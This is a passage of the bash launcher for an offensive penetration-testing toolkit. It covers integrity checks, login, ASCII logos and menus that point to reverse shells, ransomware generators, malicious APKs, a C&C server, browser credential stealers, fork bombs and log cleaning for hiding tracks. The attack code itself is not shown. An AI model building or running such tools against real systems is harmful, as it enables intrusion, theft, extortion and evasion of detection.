        echo -e "${R}[ ❌ ] CSTK's root-only library decryption key is unavailable.${X}"
        echo -e "${Y}Run install.sh as the CSTK owner to provision the key.${X}"
        return 1
    fi

    key_owner="$(stat -c '%U:%G' "$lib_decryption_key")" || return 1
    key_mode="$(stat -c '%a' "$lib_decryption_key")" || return 1
    if [[ "$key_owner" != "root:root" || "$key_mode" != "600" ]]; then
        echo -e "${R}[ ❌ ] CSTK refused an insecure library decryption key file.${X}"
        return 1
    fi

    temp_output="$(mktemp "${norm}.XXXXXX")" || {
        echo -e "${R}[ ❌ ] Unable to create a private decryption output file.${X}"
        return 1
    }

    if ! openssl enc -d -aes-256-cbc -salt -pbkdf2 \
        -in "$encfile" \
        -out "$temp_output" \
        -pass file:"$lib_decryption_key"; then
        rm -f -- "$temp_output"
        echo -e "${R}[ ❌ ] Unable to decrypt the requested CSTK library file.${X}"
        return 1
    fi

    chmod 700 "$temp_output"
    mv -f -- "$temp_output" "$norm"
}

wait_and_return() {
    [[ -t 0 && -t 1 ]] || return 0
    secure_user_data_permissions >/dev/null 2>&1 || true
    echo -e "${B} \nEnter key for main menu ${R} \nX to exit.\n ${X} "
    read -r -n 1 -p "${AA}" op || return 0
    if [[ "$op" =~ [Xx] ]]; then
        exit
    fi
    main_menu
}

show_tty_upgrade_guide() {
    local guide
    guide="$lib/tty_spawn_shell.md"

    if [[ ! -r "$guide" ]]; then
        echo -e "${R}[ ❌ ] TTY upgrade guide not found: $guide${X}" >&2
        return 1
    fi

    if [[ -t 0 && -t 1 ]]; then
        if command -v glow >/dev/null 2>&1; then
            glow -p "$guide"
        elif command -v less >/dev/null 2>&1; then
            less -R "$guide"
        else
            cat "$guide"
        fi
    else
        cat "$guide"
    fi
}

show_tty_upgrade_hint() {
    echo -e "${Y}\nIf the connection opens a basic shell, use the TTY upgrade guide:${X}"
    echo -e "${G}sudo cstk --tty${X}"
}

sync_installed_interfaces() {
    if ! bash "$lib/cstk_update.sh" sync-runtime "$home_dir"; then
        echo -e "${R}[ ❌ ] Unable to refresh the installed CSTK runtime files.${X}" >&2
        return 1
    fi
}

refresh_integrity_after_update() {
    local supplied_key

    if [[ ! -t 0 ]]; then
        echo -e "${R}[ ❌ ] An interactive terminal is required to authorize the integrity refresh.${X}" >&2
        return 1
    fi

    read -r -s -p "CSTK integrity refresh key: " supplied_key || return 1
    echo
    if ! verify_integrity_refresh_key "$supplied_key"; then
        unset supplied_key
        echo -e "${R}[ ❌ ] Integrity refresh authorization failed.${X}" >&2
        return 1
    fi
    unset supplied_key

    sync_installed_interfaces || return 1
    refresh_hashes
}

run_update_manager() {
    local mode="${1:-check}"
    local updater="$lib/cstk_update.sh"
    local update_rc

    if [[ ! -r "$updater" ]]; then
        echo -e "${R}[ ❌ ] CSTK update manager not found: $updater${X}" >&2
        return 1
    fi

    bash "$updater" "$mode" "$home_dir"
    update_rc=$?

    if [[ "$update_rc" -eq 20 ]]; then
        echo -e "${Y}CSTK was updated. The protected checksum manifest must now be rebuilt.${X}"
        if ! refresh_integrity_after_update; then
            echo -e "${R}CSTK will exit without executing the newly updated launcher.${X}" >&2
            return 1
        fi
        echo -e "${Y}Restarting the verified CSTK launcher.${X}"
        exec bash "$home_dir/cstk.sh"
    fi
    return "$update_rc"
}

more_help() {
    help_file="$bin/help_file"
    bash "$help_file"
}

delete_me_now() {
    local -a program_files program_directories

    trap '' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTOU 2>/dev/null

    program_files=(
        "/usr/local/bin/cstk"
        "$cstk_wrapper"
        "/usr/share/man/man1/cstk.1"
        "/usr/share/man/man1/cstk.1.gz"
        "$home_dir/cstk.sh"
        "$home_dir/install.sh"
        "$home_dir/uninstall.sh"
    )
    program_directories=(
        "/etc/cstk"
        "$home_dir/scripts/bin"
        "$home_dir/scripts/lib"
        "$security_checks"
    )

    rm -f -- "${program_files[@]}"
    rm -rf -- "${program_directories[@]}"
    command -v mandb >/dev/null 2>&1 && mandb >/dev/null 2>&1

    echo -e "${G}CSTK launchers and core program files were deleted.${X}"
    echo -e "${Y}Private user data, legacy Bank files, logs, wordlists, and installed system packages were preserved.${X}"
    exit 0
}

handle_integrity_failure() {
    local reason choice confirmation
    reason="$1"

    echo -e "${R}[ ⚠  ] ${reason}${X}"
    echo -e "${R}[ ❌ ] For your computer's safety, CSTK will not run.${X}"

    if [[ ! -t 0 ]]; then
        echo -e "${R}[ ❌ ] No interactive terminal is available. Exiting without making changes.${X}"
        exit 99
    fi

    echo -e "${Y}1 - Quit without making changes${X}"
    echo -e "${R}2 - Permanently delete CSTK's launchers and core program files${X}"
    read -r -s -p "Choice: " choice || exit 99
    echo

    if verify_integrity_refresh_key "$choice"; then
        sync_installed_interfaces || exit 1
        refresh_hashes || exit 1
        return 0
    fi

    case "${choice,,}" in
        2 | d | delete)
            echo -e "${R}This permanently removes CSTK's launchers and core program files.${X}"
            echo -e "${Y}Private user data, legacy Bank files, logs, wordlists, and installed packages will be preserved.${X}"
            read -r -p "Type DELETE CSTK to confirm: " confirmation || exit 99
            if [[ "$confirmation" == "DELETE CSTK" ]]; then
                delete_me_now
            fi
            echo -e "${Y}Deletion cancelled. CSTK will now exit.${X}"
            exit 99
            ;;
        *)
            echo -e "${Y}CSTK will now exit without making changes.${X}"
            exit 99
            ;;
    esac
}

refresh_hashes() {
    local manifest temp_manifest
    local -a hash_targets

    manifest="$security_checks/sha256.checksum"
    mkdir -p "$security_checks"

    hash_targets=(
        "$home_dir/cstk.sh"
        "$home_dir/uninstall.sh"
        "$home_dir/scripts/bin"
        "$home_dir/scripts/lib"
    )

    if [[ -f "$cstk_wrapper" ]]; then
        hash_targets+=("$cstk_wrapper")
    fi

    temp_manifest="$(mktemp "$security_checks/.sha256.checksum.XXXXXX")" || {
        echo -e "${R}[ ❌ ] Unable to create a temporary checksum manifest.${X}"
        return 1
    }

    if ! (
        set -o pipefail
        find "${hash_targets[@]}" \
            -type f \
            -exec sha256sum {} \; |
            LC_ALL=C sort > "$temp_manifest"
    ); then
        rm -f -- "$temp_manifest"
        echo -e "${R}[ ❌ ] Unable to rebuild the checksum manifest.${X}"
        return 1
    fi

    chmod 600 "$temp_manifest"
    mv -f -- "$temp_manifest" "$manifest"

    if ! sha256sum -c --quiet "$manifest"; then
        echo -e "${R}[ ❌ ] The new checksum manifest did not pass validation.${X}"
        return 1
    fi

    echo -e "${G}[ ✅ ] CSTK integrity hashes refreshed successfully.${X}"
}

check_hash() {
    local manifest
    manifest="$security_checks/sha256.checksum"

    if [[ ! -s "$manifest" ]]; then
        handle_integrity_failure "CSTK checksum manifest is missing."
        return $?
    fi

    if ! sha256sum -c --quiet "$manifest"; then
        handle_integrity_failure "CSTK integrity verification failed."
        return $?
    fi
}

header() {
    local random=$((RANDOM % 8 + 1))
    # The sourced Fonts functions read these dynamically scoped color variables.
    # shellcheck disable=SC2034
    local r="$R" g="$G" y="$Y" b="$B" p="$P" c="$C" x="$X"

    case $random in
        1) braille_fonts ;;
        2) digital_fonts ;;
        3) emboss_fonts ;;
        4) future_fonts ;;
        5) letter_fonts ;;
        6) pagga_fonts ;;
        7) script_fonts ;;
        8) term_fonts ;;
        *) echo "" ;;
    esac
}

load_fonts_config() {
    if [[ -f "$fonts_config_file" ]]; then
        FONTS_ENABLED=$(<"$fonts_config_file")
    else
        FONTS_ENABLED="off"
    fi

    if [[ "$FONTS_ENABLED" != "on" && "$FONTS_ENABLED" != "off" ]]; then
        FONTS_ENABLED="off"
    fi

    if [[ ! -f "$fonts_config_file" ]] || [[ "$(<"$fonts_config_file")" != "$FONTS_ENABLED" ]]; then
        printf '%s\n' "$FONTS_ENABLED" >"$fonts_config_file"
    fi
}

show_header_if_enabled() {
    if [[ "$FONTS_ENABLED" != "on" || "${HEADER_SHOWN:-no}" == "yes" ]]; then
        return 0
    fi

    if ! declare -F braille_fonts >/dev/null; then
        echo -e "${R}[ ❌ ] Fonts library not found: $lib/Fonts${X}" >&2
        return 1
    fi

    HEADER_SHOWN="yes"
    clear
    header
}

toggle_fonts() {
    load_fonts_config

    if [[ "$FONTS_ENABLED" == "on" ]]; then
        FONTS_ENABLED="off"
        echo -e "\n[ 🔤 ] Animated headers have been DISABLED"
    elif ! declare -F braille_fonts >/dev/null; then
        echo -e "${R}\n[ ❌ ] Cannot enable animated headers; the Fonts library is missing.${X}"
        return 1
    else
        FONTS_ENABLED="on"
        HEADER_SHOWN="no"
        echo -e "\n[ 🔤 ] Animated headers have been ENABLED"
    fi

    printf '%s\n' "$FONTS_ENABLED" >"$fonts_config_file"
    sleep 1
}

function logo_error() {
    echo '

                                      ______
                                   .-"      "-.
                                  /            \
                      _          |              |          _
                     ( \         |,  .-.  .-.  ,|         / )
                      > "=._     | )(__/  \__)( |     _.=" <
                     (_/"=._"=._ |/     /\     \| _.="_.="\_)
                            "=._"(_     ^^     _)"_.="
                                "=\__|IIIIII|__/="
                               _.="| \IIIIII/ |"=._
                     _     _.="_.="\          /"=._"=._     _
                    ( \_.="_.="     `--------`     "=._"=._/ )
                     > _.="                            "=._ <
                    (_/                                    \_)
                              Cyber Security Tool Kit
'
}
# get users screen size for ascii art
columns="$(tput cols 2>/dev/null || printf '80')"

function logo_main() {
    echo -e "\n\n\n
                ${D} ################################
                ${D} #    ${G}   ____ ____ _____ _  __ ${D} #
                ${D} #    ${B}  / ___/ ___|_   _| |/ / ${D} #
                ${D} #    ${R} | |   \___ \ | | | ' /  ${D} #
                ${D} #    ${P} | |___ ___) || | | . \  ${D} #
                ${D} #    ${O}  \____|____/ |_| |_|\_\ ${D} #
                ${D} ################################  ${X}"
}

function logo_main2() {
echo -e "\n\n\n
\t${D} ##################################################################################################################################
\t${D} # ${G}	   ______      __                   _____                      _ __             ______            __     __ __ _ __    ${D}   #
\t${D} # ${B}	  / ____/_  __/ /_  ___  _____     / ___/___  _______  _______(_) /___  __     /_  __/___  ____  / /    / //_/(_) /_   ${D}   #
\t${D} # ${R}	 / /   / / / / __ \/ _ \/ ___/     \__ \/ _ \/ ___/ / / / ___/ / __/ / / /      / / / __ \/ __ \/ /    / ,<  / / __/   ${D}   #
\t${D} # ${P}	/ /___/ /_/ / /_/ /  __/ /        ___/ /  __/ /__/ /_/ / /  / / /_/ /_/ /      / / / /_/ / /_/ / /    / /| |/ / /_     ${D}   #
\t${D} # ${Y}	\____/\__, /_.___/\___/_/        /____/\___/\___/\__,_/_/  /_/\__/\__, /      /_/  \____/\____/_/    /_/ |_/_/\__/     ${D}   #
\t${D} # ${O}	     /____/                                                      /____/                                                ${D}   #
\t${D} ################################################################################################################################## ${X}"
}

function logo_recon() {
echo -e "\n\n\n ${g}
 _____
|  __ \
| |__) |___  ___ ___  _ __
|  _  // _ \/ __/ _ \| '_ \
| | \ \  __/ (_| (_) | | | |
|_|  \_\___|\___\___/|_| |_|
"
}

function logo_scanning() {
echo -e "\n\n\n ${g}
  _____                       _
 / ____|                     (_)
| (___   ___ __ _ _ __  _ __  _ _ __   __ _
 \___ \ / __/ _\` | '_ \| '_ \| | '_ \ / _\` |
 ____) | (_| (_| | | | | | | | | | | | (_| |
|_____/ \___\__,_|_| |_|_| |_|_|_| |_|\__, |
                                       __/ |
                                      |___/
"
}

function logo_vuln_ass() {
echo -e "\n\n\n ${g}
▌ ▌   ▜             ▌  ▗▜ ▗▐      ▞▀▖                         ▐
▚▗▘▌ ▌▐ ▛▀▖▞▀▖▙▀▖▝▀▖▛▀▖▄▐ ▄▜▀ ▌ ▌ ▙▄▌▞▀▘▞▀▘▞▀▖▞▀▘▞▀▘▛▚▀▖▞▀▖▛▀▖▜▀
▝▞ ▌ ▌▐ ▌ ▌▛▀ ▌  ▞▀▌▌ ▌▐▐ ▐▐ ▖▚▄▌ ▌ ▌▝▀▖▝▀▖▛▀ ▝▀▖▝▀▖▌▐ ▌▛▀ ▌ ▌▐ ▖
 ▘ ▝▀▘ ▘▘ ▘▝▀▘▘  ▝▀▘▀▀ ▀▘▘▀▘▀ ▗▄▘ ▘ ▘▀▀ ▀▀ ▝▀▘▀▀ ▀▀ ▘▝ ▘▝▀▘▘ ▘ ▀
"
}

function logo_exploitation() {
echo -e "\n\n\n ${g}
▛▀▘      ▜    ▗▐     ▐  ▗
▙▄ ▚▗▘▛▀▖▐ ▞▀▖▄▜▀ ▝▀▖▜▀ ▄ ▞▀▖▛▀▖
▌  ▗▚ ▙▄▘▐ ▌ ▌▐▐ ▖▞▀▌▐ ▖▐ ▌ ▌▌ ▌
▀▀▘▘ ▘▌   ▘▝▀ ▀▘▀ ▝▀▘ ▀ ▀▘▝▀ ▘ ▘
"
}

function logo_maintain_access() {
echo -e "\n\n\n ${g}
▙▗▌   ▗    ▐     ▗    ▗        ▞▀▖
▌▘▌▝▀▖▄ ▛▀▖▜▀ ▝▀▖▄ ▛▀▖▄ ▛▀▖▞▀▌ ▙▄▌▞▀▖▞▀▖▞▀▖▞▀▘▞▀▘
▌ ▌▞▀▌▐ ▌ ▌▐ ▖▞▀▌▐ ▌ ▌▐ ▌ ▌▚▄▌ ▌ ▌▌ ▖▌ ▖▛▀ ▝▀▖▝▀▖
▘ ▘▝▀▘▀▘▘ ▘ ▀ ▝▀▘▀▘▘ ▘▀▘▘ ▘▗▄▘ ▘ ▘▝▀ ▝▀ ▝▀▘▀▀ ▀▀
"
}

function logo_osint() {
echo -e "\n\n\n ${g}
\t\t	   ____     _____    ____   _   __   ______ ${X}
\t\t	  / __ \   / ___/   /  _/  / | / /  /_  __/ ${G}
\t\t	 / / / /   \__ \    / /   /  |/ /    / /    ${B}
\t\t	/ /_/ /   ___/ /  _/ /   / /|  /    / /     ${R}
\t\t	\____/   /____/  /___/  /_/ |_/    /_/      ${P}
\t\t                                                ${X}"
}

function logo_payload() {
echo -e "\n\n\n ${G}
\t\t	    ____  _____  ____    ____  ___    ____  _____ ${B}
\t\t	   / __ \/   \ \/ / /   / __ \/   |  / __ \/ ___/ ${R}
\t\t	  / /_/ / /| |\  / /   / / / / /| | / / / /\__ \  ${Y}
\t\t	 / ____/ ___ |/ / /___/ /_/ / ___ |/ /_/ /___/ /  ${P}
\t\t	/_/   /_/  |_/_/_____/\____/_/  |_/_____//____/   ${O}
\t\t                                                      ${X}"
}

function logo_postexploit() {
echo -e "\n\n\n ${P}
\t\t	    ____  ____  ___________   _______  __ ____  __    ____  __________ ${G}
\t\t	   / __ \/ __ \/ ___/_  __/  / ____/ |/ // __ \/ /   / __ \/  _/_  __/ ${B}
\t\t	  / /_/ / / / /\__ \ / /    / __/  |   // /_/ / /   / / / // /  / /    ${O}
\t\t	 / ____/ /_/ /___/ // /    / /___ /   |/ ____/ /___/ /_/ // /  / /     ${Y}
\t\t	/_/    \____//____//_/    /_____//_/|_/_/   /_____/\____/___/ /_/      ${X}"
}

function logo_etc() {
echo -e "\n\n\n ${G}
\t\t	    ______   ______   ______ ${B}
\t\t	   / ____/  /_  __/  / ____/ ${O}
\t\t	  / __/      / /    / /      ${P}
\t\t	 / /___     / /    / /___    ${Y}
\t\t	/_____/    /_/     \____/    ${X}"
}

function logo_help() {
echo -e "\n\n\n ${B}
\t\t 	    _/    _/${G}  _/_/_/_/${O}  _/      ${R}  _/_/_/  ${B}
\t\t	   _/    _/${G}  _/      ${O}  _/      ${R}  _/    _/${B}
\t\t	  _/_/_/_/${G}  _/_/_/  ${O}  _/      ${R}  _/_/_/  ${B}
\t\t	 _/    _/${G}  _/      ${O}  _/      ${R}  _/      ${B}
\t\t	_/    _/${G}  _/_/_/_/${O}  _/_/_/_/${R}  _/      ${X}"
}

check_if_password_is_needed() {
    if [[ -f "$config_file" ]]; then
        AUTH_ENABLED=$(<"$config_file")
    else
        AUTH_ENABLED="on"
        printf '%s\n' "$AUTH_ENABLED" >"$config_file"
    fi
    if [[ ! -f "$hash_file" ]]; then
        : >"$hash_file"
        chmod 600 "$hash_file"
    fi
    if [[ "$AUTH_ENABLED" == "on" ]]; then
        getpasswd
    else
        main_menu
    fi
}

toggle_auth() {
    [[ -f "$hash_file" ]] || touch "$hash_file" && chmod 600 "$hash_file"
    if [[ -f "$config_file" ]]; then
        AUTH_ENABLED=$(<"$config_file")
    else
        AUTH_ENABLED="on" # default to secure mode
        echo "$AUTH_ENABLED" > "$config_file"
    fi

    if [[ "$AUTH_ENABLED" == "on" ]]; then
        AUTH_ENABLED="off"
        echo -e "\n[ 🔓 ] Authentication has been DISABLED"
    else
        AUTH_ENABLED="on"
        echo -e "\n[ 🔒 ] Authentication has been ENABLED"
    fi
    printf '%s\n' "$AUTH_ENABLED" > "$config_file"
    sleep 1
}

create_password() {
    local hashed_password name password password2
    if [[ -z "$1" ]]; then
        echo -e "\n[ 🔐 ] Enter a username:"
        read -r name
    else
        name="$1"
    fi
    if grep -q "^${name}[[:space:]]" "$hash_file"; then
        echo -e "\n[ ⚠  ] User already exists.\n"
        sleep 2
        getpasswd "$name"
        return
    fi
    echo -n "[ 🔑 ] Enter new password: "
    read -r -s password
    while [[ -z "$password" ]]; do
        echo "Error: Password cannot be empty." >&2
        read -r -s password
    done
    echo
    echo -n "[ 🔁 ] Re-enter password to confirm: "
    read -r -s password2
    until [[ "$password" == "$password2" ]]; do
        echo "Passwords don't match"
        sleep 3
        read -rsp "Enter a password: " password
        echo "" # Prints a newline after the hidden input
        if [[ -z "$password" ]]; then
            echo "Error: Password cannot be empty." >&2
            exit 1
        fi
        read -rsp "Enter again to verify " password2
    done
    hashed_password=$(openssl passwd -6 -stdin <<< "$password")
    printf "%s\t\t%s\n" "$name" "$hashed_password" >>"$hash_file"
    echo -e "\n[ ✅ ] User '$name' added successfully!\n"
    getpasswd "$@"
}

getpasswd() {
    local name="$1"
    local attempts=0
    local max_attempts=3
    local cooldown=600 # 10 minutes
    local name ans stored_hash extracted_salt password passwd_offered
    if [[ -z "$name" ]]; then
        read -r -p "Enter Username: " name
    else
        name="$1"
    fi
    if ! grep -q "^${name}[[:space:]]" "$hash_file"; then
        echo -e "\n[ ⚠  ] Username not found. Register new user? (Y/n): "
        read -r ans
        ans=${ans,,}
        if [[ "$ans" =~ ^y$|^yes$|^$ ]]; then
            create_password "$@"
            return
        else
            exit 1
        fi
    fi
    stored_hash=$(grep "^${name}[[:space:]]" "$hash_file" | awk '{print $2}')
    extracted_salt=$(echo "$stored_hash" | cut -d'$' -f3)
    while true; do
        read -rsp "Enter your password: " password
        echo ""
        passwd_offered=$(printf "%s" "$password" | openssl passwd -6 -salt "$extracted_salt" -stdin)
        if [[ "$stored_hash" == "$passwd_offered" ]]; then
            main_menu
        fi
        ((attempts++))
        if (( attempts >= max_attempts )); then
            echo -e "\n[ 🔒 ] Too many failed attempts. Access denied."
            trap '' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTOU 2>/dev/null
            echo -e "[ ⏱  ] Locking out for $cooldown seconds..."
            sleep "$cooldown"
            attempts=0
        else
            echo "Incorrect Password. Try again."
            sleep 3
        fi
    done
}

strip_ansi() {
    local s
    printf -v s "%s" "$1"
    s="$(echo -ne "$s" | sed -r $'s/\x1B\\[[0-9;]*[mK]//g')"
    printf "%s" "$s"
}

visible_len() {
    local plain
    plain="$(strip_ansi "$1")"
    printf "%s" "${#plain}"
}

print_menu_line() {
    local idx="$1"
    local colored_title="$2" # e.g. "${g} Crypto Regex Search ${G}"
    local plain_title="$3"   # e.g. "Crypto Regex Search" (used for length calc)
    local desc="$4"
    local title_width="${5:-36}"
    local tlen
    tlen=$(visible_len "$plain_title")
    local pad=$((title_width - tlen))
    ((pad < 1)) && pad=1
    local cols
    cols=$(tput cols 2>/dev/null || echo 80)
    local reserved=8 # spaces for "X - " and some margin
    local desc_width=$((cols - title_width - reserved))
    ((desc_width < 20)) && desc_width=20
    printf "%2s - %s" "$idx" "$colored_title"
    printf '%*s' "$pad" ''
    echo "$desc" | fold -s -w "$desc_width" | {
        read -r firstline || firstline=""
        printf " %s\n" "$firstline"
        local subsequent_indent
        subsequent_indent=$((title_width + 6)) # spaces to align wrapped desc lines
        while read -r line; do
            printf "%*s%s\n" "$subsequent_indent" '' "$line"
        done
    }
}

print_menu() {
    local header="$1"
    shift
    local entries=("$@")
    echo
    echo -e "$header"
    echo
    local maxlen=0
    for e in "${entries[@]}"; do
        IFS='|' read -r idx colored plain desc <<<"$e"
        local len
        len=$(visible_len "$plain")
        ((len > maxlen)) && maxlen=$len
    done
    local title_width=$((maxlen + 2))
    ((title_width < 24)) && title_width=24
    ((title_width > 46)) && title_width=46
    for e in "${entries[@]}"; do
        IFS='|' read -r idx colored plain desc <<<"$e"
        print_menu_line "$idx" "$colored" "$plain" "$desc" "$title_width"
    done
    echo
}

main_menu() {
    check_hash || exit 1
    load_fonts_config
    show_header_if_enabled || true
    clear
    if [[ "$columns" -gt 130 ]]; then
        logo_main2
    else
        logo_main
    fi
    echo -e "\n ${O}
         Enter Class Number: \n\n ${g}
         ${O}TOOLS:${g}
         1 -${B} OSINT         ${g}
         2 -${B} PAYLOADS      ${g}
         3 -${B} POST EXPLOIT  ${g}
         4 -${B} ETC  ${g}\n
         ${O}SYSTEM CONFIGURATION:${g}
         5 -${B} Toggle Authentication ${Y}(Currently: $AUTH_ENABLED)  ${g}
         6 -${B} Toggle Animated Headers ${Y}(Currently: $FONTS_ENABLED)  ${g}
         L -${B} Explicit Standalone Lab Mode  ${g}\n
         G -${B} Engagements / Scope / Guarded Operations  ${g}\n
         7 -${B} Private Loot / Malware / Logs and Backups  ${g}
         8 -${B} DEFENSE  ${g}
         U -${B} Check / Install CSTK Updates  ${g}
         T -${B} TTY Shell Upgrade Guide  ${g}
         X -${R} exit ${X}\n\n\n "

    read -r -p "${O} ${AA} ${X}" num || return 0
    case "$num" in
        [1-4]) handle_input "$num" ;;
        [Gg]) clear; engagement_manager_menu; main_menu ;;
        [Ll]) select_standalone_lab; main_menu ;;
        5) toggle_auth && sleep 3 && main_menu ;;
        6) toggle_fonts && sleep 3 && main_menu ;;
        7) clear; private_data_menu; main_menu ;;
        8) clear; defense_menu; main_menu ;;
        [Uu]) clear; run_update_manager update; wait_and_return ;;
        [Tt]) clear; show_tty_upgrade_guide; wait_and_return ;;
        [Xx]) exit 0 ;;
        *) main_menu ;;
    esac
}

handle_input() {
    case "$1" in
        1)  clear; logo_osint ; a="$AO" ; header="${O} \n\n Enter OSINT Tool Number:${g}"
            entries=(
                "1|${G} ip address lookup${B}|ip address lookup| GPS Coordinates, city, state, ISP  ${g}"
                "2|${G} ping sweeper tool${B}|ping sweeper tool| Automate a ping sweep of ip XXX.XXX.XXX.1-256 ${g}"
                "3|${G} nmap tool${B}|nmap tool| Automated nmap helper script ${g}"
                "4|${G} auto enum${B}|auto enum| Automated nslookup, dig, sublist3r, mysql, nikto, gobuster, wpscan and more ${g}"
                "5|${G} pawned email check${B}|pawned email check| Check __@domain.com breached email/password combos or a single email ${g}"
                "6|${G} google dorks helper${B}|google dorks helper| Search terms for passwords, exploits, vulnerabilities 7000 options ${g}"
                "7|${G} email search tool${B}|email search tool| Search for a email linked to 100+ social media accounts ${g}"
                "8|${G} password attack tool${B}|password attack tool| Crack online/offline passwords using a number of different tools ${g}"
                "9|${G} auto vuln search${B}|auto vuln search| Search for vulnerabilities on an IP range using nrich and searchsploit ${g}"
                "A|${G} user name generator${B}|user name generator| Takes 3 username variables and 3 extensions ${g}"
                "B|${G} ssh enum remote target${B}|ssh enum remote target| Enumerate a linux target on ssh needs username and password ${g}"
                "C|${G} waf detect${B}|waf detect| Detect a firewall on a single website or multiple websites from a file ${g}"
                "X|${R} Back to main menu${X}|Back to main menu|${X}"
            )
            print_menu "$header" "${entries[@]}"
            ;;
        2)  clear; logo_payload ; a="$AP" ; header="${O} \n\n Enter Payload Tool Number:${g}"
            entries=(
                "1|${G} Encrypted netcat shell${B}|Encrypted netcat shell| Create a nc binding/reverse script ${g}"
                "2|${G} Back door creation tool${B}|Back door creation tool| Linux reverse shell script that test over 30 exploits ${g}"
                "3|${G} Ransomware scripts${B}|Ransomware scripts| Create a Ransomware encryption/decryption shell scripts ${g}"
                "4|${G} Multi OS reverse shells${B}|Multi OS reverse shells| Many Payload types using encoding and tricky distribution methods ${g}"
                "5|${G} No touch disk payload${B}|No touch disk payload| Create a payload that runs in memory once transferred to a website  ${g}"
                "6|${G} Start a DoS Bomb${B}|Start a DoS Bomb| Create a zip bomb, computer-killer payload, or fork bomb ${g}"
                "7|${G} SSH Payload script${B}|SSH Payload script| Replaces users .ssh directory adding your private key and restricting access ${g}"
                "8|${G} Metasploit (msfvenom)${B}|Metasploit (msfvenom)| Create a script or embed a binary file for remote connection ${g}"
                "9|${G} APK Builder${B}|APK Builder| Create a malicious Android .apk for remote access ${g}"
                "A|${G} Command and Control Server${B}|Command and Control Server| A C&C Server for remote access connections and payloads ${g}"
                "X|${R} Back to main menu ${X}|Back to main menu${X}"
            )
            print_menu "$header" "${entries[@]}"
            ;;
        3)  clear; logo_postexploit ; a="$AX" ; header="${O} \n\n Enter Exploit Tool Number:${g}"
            entries=(
                "1|${G} Check if on VM${B}|Check if on VM| Did i gain a shell on a Virtual Machine ${g}"
                "2|${G} Web browser info stealer${B}|Web browser info stealer| Gather passwords, cookies, user history, and more Firefox, Chrome, others ${g}"
                "3|${G} Crypto Regex Search${B}|Crypto Regex Search| Find Crypto wallets or credit cards numbers on a system ${g}"
                "4|${G} File Permissions Exploitation${B}|File Permissions Exploitation| Sudo, Root Permissions Exploit ${g}"
                "5|${G} Check Kernel Exploits${B}|Check Kernel Exploits| Checks for kernel exploits on the current computer ${g}"
                "6|${G} Embed a command on start up${B}|Embed a command on start up| Embed a command that runs on system start ${g}"
                "7|${G} Brute Force a locked file${B}|Brute Force a locked file| Brute force a zip, rar, 7z password protected file using a password list ${g}"
                "8|${G} Files of Interest${B}|Files of Interest| Find Interesting files on Linux systems ${g}"
                "9|${G} In-Memory Password Audit${B}|In-Memory Password Audit| Best-effort check of supported live processes for recoverable passwords ${g}"
                "X|${R} Back to main menu${X}|Back to main menu${X}"
            )
            print_menu "$header" "${entries[@]}"
            ;;
        4)  clear; logo_etc ; a="$AE" ; header="${O} \n\n Enter Tool Number:${g}"
            entries=(
                "1|${G} Users and Shells${B}|Users and Shells| Find all users and their default shells local computer ${g}"
                "2|${G} Python Web server${B}|Python Web server| Start a webserver for File Transfers ${g}"
                "3|${G} Extract Archive files${B}|Extract Archive files| Opens a tar, 7z, zip, dpkg, plus many more archives - non password protected ${g}"
                "4|${G} Openssl Helper${B}|Openssl Helper| Public/Private keys, hashing, checksums, encrypt/decrypt, random byte generator ${g}"
                "5|${G} Secret Message${B}|Secret Message| Create or decode a secret message hidden in a gpg key  ${g}"
                "6|${G} Create Binary${B}|Create Binary| Takes a bash/sh shell script and creates a non readable executable binary file ${g}"
                "7|${G} Portable assessment kit${B}|Portable assessment kit| Export the standalone Zip2Go local assessment archive ${g}"
                "8|${G} Array Encryption Script${B}|Array Encryption Script| Create a complex array executable script of users chosen command ${g}"
                "9|${G} Log Cleaning Tool${B}|Log Cleaning Tool| Run a program to clean users logs for hiding tracks ${g}"
                "A|${G} Arsenal-ng${B}|Arsenal-ng| Use the current systems available tools to your advantage with syntax help ${g}"
                "B|${G} Hash Identify${B}|Hash Identify| Attempts to identify the hash(s) of a users STDIN or a file ${g}"
                "C|${G} CSTK AI Analyst${B}|CSTK AI Analyst| Defensive analysis through an operator-selected AI endpoint ${g}"
                "X|${R} Back to main menu ${X}|Back to main menu${X}"
            )
            print_menu "$header" "${entries[@]}"
            ;;
        *)  main_menu ;;
    esac
    read -r -p "${O} ${a} ${X}" choice || return 0
    execute_tool "$1" "$choice"
}

execute_tool() {
    case $1 in
        1) case $2 in
            1) find_that_ip ;;
            2) sweep_ip ;;
            3) nmap_tool ;;
            4) enum_tool ;;
            5) breach_parse_wrapper ;;
            6) google_dorks ;;
            7) email_search ;;
            8) pass_attack ;;
            9) vuln_searcher ;;
            A|a) username_gen ;;
            B|b) ssh_enum ;;
            C|c) waf_detect ;;
            X|x) main_menu ;;
            *) main_menu ;;
           esac
           ;;
        2) case $2 in
            1) netcat_choice ;;
            2) rev_shells ;;
            3) ransomware_shell_options ;;
            4) rev_shells_all ;;
            5) no_touch_script ;;
            6) dos_bomb_attack ;;
            7) ssh_attack ;;
            8) msf_payloads ;;
            9) apk_killer ;;
            A|a) cnc_server ;;
            X|x) main_menu ;;
            *) main_menu ;;
           esac
           ;;
        3) case $2 in
            1) check_the_vm ;;
            2) browser_data_wrapper ;;
            3) crypto_catch ;;
            4) check_gtfob ;;
            5) linux_exploits_check ;;
            6) startup_command ;;
            7) brute_force_file ;;
            8) files_of_interest ;;
            9) inmem_password_stealer ;;
            X|x) main_menu ;;
            *) main_menu ;;
           esac
           ;;
        4) case $2 in
            1) users_and_shells ;;
            2) py_web_server ;;
            3) extract_arch ;;
            4) r_b_g_wrapper ;;
            5) gpg_lookalike_wrapper ;;
            6) create_exe_binary ;;
            7) post_x_2_go ;;
            8) array_enc_script ;;
            9) log_cleaning_tool ;;
            A|a) arsenal ;;
            B|b) hash_id ;;
            C|c) cstk_ai_analyst ;;
            X|x) main_menu ;;
            *) main_menu ;;
           esac
           ;;
        *) main_menu ;;
    esac
}

error_font() {
    logo_error
    echo -e "${R} \nBad Option: Returning to Main Menu \n ${X} "
    wait_and_return
}
# Grab  user IP to use for reverse shells Etc...
getip() {
    valid_ipv4() {
        local ip IFS
        ip=$1
        IFS=.
        local -a a
        read -r -a a <<<"$ip"
        [[ ${#a[@]} -eq 4 ]] || return 1
        for oct in "${a[@]}"; do
            [[ "$oct" =~ ^[0-9]+$ ]] || return 1
